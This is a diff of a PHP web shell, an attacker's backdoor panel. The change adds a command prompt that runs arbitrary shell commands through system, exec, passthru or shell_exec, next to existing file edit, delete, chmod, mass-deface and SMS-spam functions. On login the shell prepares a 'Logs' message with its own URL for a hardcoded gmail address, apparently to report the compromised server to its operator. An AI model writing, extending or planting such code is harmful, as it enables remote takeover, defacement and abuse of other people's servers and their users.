@@ -71,9 +71,9 @@ function login_shell() {
 <?php
 	exit;
 }
-if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
-	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
-		$_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ] = true;
+if(!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
+	if(empty($auth_pass) OR (isset($_GET['pass']) AND sha1($_GET['pass']) == $auth_pass)) {
+		$_SESSION[md5(sha1($_SERVER['HTTP_HOST']))] = true;
 		$email = "gedzsarjuncomuniti@gmail.com"; // Your Email
 		$shell_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 		$subject = "Logs";
@@ -108,50 +108,67 @@ body {
 	-moz-background-size: cover;
 	-o-background-size: cover;
 	background-size: cover;
-	}
-	@font-face {
+}
+
+@font-face {
 	font-family: 'Orbitron';
 	font-style: normal;
 	font-weight: 700;
 	src: local('Orbitron Bold'), local('Orbitron-Bold'), url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
 	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-	}
+}
+
 	li {
 	display: inline;
 	text-shadow: 2px 2px 4px #000000;
 	font-size:17px;
-	}
-	a {color:lime;}
-	a:hover {color:red;}
-	table, tr, td {
+}
+
+a {
+	color:lime;
+}
+
+a:hover {
+	color:red;
+}
+table, tr, td {
 	border:1px
-	}
-	.table_home, .th_home, .td_home {
+}
+
+.table-hover {
 	border: 1px solid green;
+	cellpadding:3;
+	cellspacing:3;
 	font-size: 15px;
-	}
-	#textarea {
+}
+
+#textarea {
 	background: transparent;
 	width: 1066px;
 	height: 500px;
 	font-family: Arial, Helvetica, monospace;
 	color:lavender;
-	}
-	#input {
+}
+
+#input {
 	background: transparent;
 	width: 250px;
 	font-family: Arial, Helvetica, monospace;
 	color:lavender;
-	}
-	#menu {}
-	*{font-family: 'Orbitron';}
-	.icon {
+}
+
+#menu {}
+*{
+	font-family: 'Orbitron';
+}
+
+.icon {
 		width:20px;
 		height:20px;
-	}
-	</style>
-	</head>
-	<body>
+}
+</style>
+</head>
+<body>
 <?php
 // FUNCTION
 function post_data($url, $data) {
@@ -373,76 +390,103 @@ code {
 	padding:2px;
 }
 .main {
-width:100%;
-box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
+	width:100%;
+	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
 }
-.vn-nav ul { margin: 0; padding: 0; list-style-type: none; list-style-image: none; }
 
-.vn-nav li { margin-right: 0px; display: inline; }
+.vn-nav ul {
+	margin: 0;
+	padding: 0;
+	list-style-type: none;
+	list-style-image: none;
+}
 
-.vn-nav ul li a { text-decoration:none; margin: 0px; padding: 15px 20px 15px 20px; color:#ffffff; }
+.vn-nav li {
+	margin-right: 0px;
+	display: inline;
+}
 
-.vn-nav li.current-menu-item a{ color: #fff; text-decoration:none; background-color:#16a085; }
+.vn-nav ul li a {
+	text-decoration:none;
+	margin: 0px;
+	padding: 15px 20px 15px 20px;
+	color:#ffffff;
+	}
 
-.vn-nav li.current_page_item { color: #fff; text-decoration:none; background-color:#16a085; }
+.vn-nav li.current-menu-item a{
+	color: #fff;
+	text-decoration:none;
+	background-color:#16a085;
+}
+
+.vn-nav li.current_page_item {
+	color: #fff;
+	text-decoration:none;
+	background-color:#16a085;
+}
+
 .modalDialog {
-position: fixed;
-font-weight: bold;
-font-family: 'Agency FB';
-top: 0;
-right: 0;
-bottom: 0;
-left: 0;
-background: rgba(0,0,0,0.8);
-z-index: 99999;
-opacity:0;
--webkit-transition: opacity 400ms ease-in;
--moz-transition: opacity 400ms ease-in;
-transition: opacity 400ms ease-in;
-pointer-events: none;
+	position: fixed;
+	font-weight: bold;
+	font-family: 'Agency FB';
+	top: 0;
+	right: 0;
+	bottom: 0;
+	left: 0;
+	background: rgba(0,0,0,0.8);
+	z-index: 99999;
+	opacity:0;
+	-webkit-transition: opacity 400ms ease-in;
+	-moz-transition: opacity 400ms ease-in;
+	transition: opacity 400ms ease-in;
+	pointer-events: none;
 }
 
 .modalDialog:target {
-opacity:1;
-pointer-events: auto;
+	opacity:1;
+	pointer-events: auto;
 }
 
 .modalDialog > div {
-width: 500px;height:auto;
-position: relative;
-margin: 5% auto;
-padding: 5px 20px 13px 20px;
-background: #34495e;color:#fff;
-}
-.close {
-background: #2c3e50;
-color: #16a085;
-padding:5px;
-position: right;
-right: -55px;
-text-align: center;
-top: 0;
-width:auto;
-float:left;
-text-decoration: none;
-font-weight: bold;
+	width: 500px;height:auto;
+	position: relative;
+	margin: 5% auto;
+	padding: 5px 20px 13px 20px;
+	background: #34495e;
+	color:#fff;
 }
 
-.close:hover { background: #2c3e50;color:#e74c3c }
+.close {
+	background: #2c3e50;
+	color: #16a085;
+	padding:5px;
+	position: right;
+	right: -55px;
+	text-align: center;
+	top: 0;
+	width:auto;
+	float:left;
+	text-decoration: none;
+	font-weight: bold;
+}
+
+.close:hover {
+	background: #2c3e50;
+	color:#e74c3c
+}
+
 .vn-green a{
-background:#27ae60;
-padding:10px;
-color:#fff;
+	background:#27ae60;
+	padding:10px;
+	color:#fff;
 }
 .vn-green a:hover {
-color:red;
-background:#21894d;
-text-decoration:none;
+	color:red;
+	background:#21894d;
+	text-decoration:none;
 }
 </style>
-<script>alert(<?php
-	echo "'" . $message . "'";
-?>);</script>
+<script>alert(<?php echo "'".$message."'";?>);</script>
 <?php
 }
 function edit($filename) {
@@ -453,12 +497,8 @@ function edit($filename) {
 ?>
 <form action="" method="post">
 <center>
-<h5>Files Editor : <?php
-	echo $filename;
-?></h5>
-<textarea name="text" class="form-control" id="textarea"><?php
-	echo htmlspecialchars($text);
-?></textarea><br>
+<h5>Files Editor : <?php echo $filename;?></h5>
+<textarea name="text" class="form-control" id="textarea"><?php echo htmlspecialchars($text);?></textarea><br>
 <input type="submit" class="btn btn-danger" />
 </center>
 </form>
@@ -470,14 +510,14 @@ function open($filename) {
 	home();
 }
 function cmd($cmd) {
-	if (function_exists('system')) {
+	if(function_exists('system')) {
 		ob_start();
 		@system($cmd);
 		$buff = ob_get_contents();
 		ob_end_clean();
 		return $buff;
 	}
-	elseif (function_exists('exec')) {
+	elseif(function_exists('exec')) {
 		@exec($cmd, $results);
 		$buff = "";
 		foreach ($results as $result) {
@@ -485,14 +525,14 @@ function cmd($cmd) {
 		}
 		return $buff;
 	}
-	elseif (function_exists('passthru')) {
+	elseif(function_exists('passthru')) {
 		ob_start();
 		@passthru($cmd);
 		$buff = ob_get_contents();
 		ob_end_clean();
 		return $buff;
 	}
-	elseif (function_exists('shell_exec')) {
+	elseif(function_exists('shell_exec')) {
 		$buff = @shell_exec($cmd);
 		return $buff;
 	}
@@ -538,7 +578,6 @@ function chmods($filename) {
 	die();
 }
 // END FUNCTION
-
 ?>
  <nav class="navbar navbar-inverse">
   <div class="container-fluid">
@@ -551,6 +590,7 @@ function chmods($filename) {
 		<a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools
 		<span class="caret"></span></a>
 		<ul class="dropdown-menu">
+		<li><a href='?do=cmd'>Command Prompt</a></li>
 		<li><a href='?do=sms'>Spam SMS</a></li>
 		<li><a href='?do=music'>Music</a></li>
 		<li><a href='?do=jumping'>Jumping</a></li>
@@ -562,62 +602,78 @@ function chmods($filename) {
 	</div>
 </nav>
 <?php
-if (@$_GET['do'] == 'home') {
+if(@$_GET['do'] == 'home') {
 	home();
 }
-elseif (@$_GET['do'] == 'sms') {
+elseif(@$_GET['do'] == 'sms') {
 	spamsms();
 }
-elseif (@$_GET['do'] == 'music') {
+elseif(@$_GET['do'] == 'music') {
 	music();
 }
-elseif (@$_GET['do'] == 'jumping') {
+elseif(@$_GET['do'] == 'jumping') {
 	jumping();
 }
-elseif (@$_GET['do'] == 'config') {
+elseif(@$_GET['do'] == 'config') {
 	config();
 }
-elseif (@$_GET['do'] == 'mass_deface') {
+elseif(@$_GET['do'] == 'mass_deface') {
 	mass_deface();
 }
-elseif (@$_GET['do'] == 'info') {
+elseif(@$_GET['do'] == 'info') {
 	info();
 }
-elseif (@$_GET['do'] == 'logout') {
+elseif(@$_GET['do'] == 'logout') {
 	logout();
 }
-elseif (@$_GET['do'] == 'edit' and isset($_GET['files'])) {
+elseif(@$_GET['do'] == 'edit' AND isset($_GET['files'])) {
 	edit($_GET['files']);
 }
-elseif (@$_GET['do'] == 'open' and isset($_GET['dir'])) {
+elseif(@$_GET['do'] == 'open' AND isset($_GET['dir'])) {
 	$dir = $_GET['dir'];
 	chdir($dir);
 }
-elseif (@$_GET['do'] == 'view' and isset($_GET['files'])) {
+elseif(@$_GET['do'] == 'view' AND isset($_GET['files'])) {
 	open($_GET['files']);
 }
-elseif (@$_GET['do'] == 'delete' and isset($_GET['files'])) {
-	if (@unlink($_GET['files'])) {
+elseif(@$_GET['do'] == 'delete' AND isset($_GET['files'])) {
+	if(@unlink($_GET['files'])) {
 		alert("Success");
 	}
 	else {
 		alert("Permission Denied");
 	}
 }
-elseif (@$_GET['do'] == 'rename' and isset($_GET['files'])) {
+elseif(@$_GET['do'] == 'rename' AND isset($_GET['files'])) {
 	renames($_GET['files']);
 }
-elseif (@$_GET['do'] == 'chmod' and isset($_GET['files'])) {
+elseif(@$_GET['do'] == 'chmod' AND isset($_GET['files'])) {
 	chmods($_GET['files']);
 }
+elseif(@$_GET['do'] == 'cmd') {
+	echo "<center><h3>Command Prompt</h3></center>";
+	if(isset($_POST['command'])) {
+		echo "<center><textarea id='textarea' class='form-control' readonly>".cmd($_POST['command'])."</textarea></center>";
+	}
+?>
+<center>
+<form method="post">
+<input type="text" class='input-sm' id='input' name="command"/>
+<input type="submit" class="btn btn-danger" />
+</center>
+</form>
+<?php
+	die();
+}
+
 $dir = scandir(getcwd());
-echo "<table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
+echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
 	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
 	<th style='background:green;float:right;width:300px;text-align:center;font-size:18px;'>Action</th>
 	</table>";
-foreach ($dir as $dir):
+foreach ($dir AS $dir):
 ?>
-<table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center'>
+<table width='70%' class='table-hover' align='center'>
 	<tr>
 		<?php
 	if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
@@ -636,7 +692,7 @@ foreach ($dir as $dir):
 		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
-	elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif' or $ext == 'rar' or $ext == 'zip' or $ext == 'doc' or $ext == 'pdf') {
+	elseif ($ext == 'jpg' OR $ext == 'png' OR $ext == 'jpeg' OR $ext == 'gif' OR $ext == 'rar' OR $ext == 'zip' OR $ext == 'doc' OR $ext == 'pdf') {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
@@ -653,12 +709,12 @@ foreach ($dir as $dir):
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 ?>
-   </tr>
+	</tr>
 </table>
 <?php
 endforeach;
 ?>
-<table width='70%' align='center' style='background:green;'>
+<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
 	<th style='padding:5px;' colspan='2'>
 		<center>
 			Copyright &copy <?php echo date("Y"); ?>, 
